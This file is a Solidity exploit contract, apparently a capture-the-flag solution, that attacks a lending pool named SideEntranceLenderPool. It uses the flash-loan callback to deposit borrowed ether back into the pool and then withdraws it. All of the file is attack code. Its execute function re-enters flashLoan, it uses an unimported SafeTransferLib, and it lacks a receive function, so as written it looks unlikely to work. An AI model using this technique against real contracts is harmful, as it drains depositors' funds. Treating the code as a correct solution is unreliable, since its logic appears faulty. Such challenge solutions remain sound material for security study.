// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackerContract is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public victim;

    constructor(SideEntranceLenderPool _victim) {
        victim = _victim;
    }

    function attack() external payable {
        uint256 amount = address(victim).balance;
        victim.flashLoan(amount);
    }

function execute() external override payable {
    victim.deposit{value: msg.value}();
    victim.flashLoan(msg.value);
}


    function collectEther() external {
        victim.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }
}
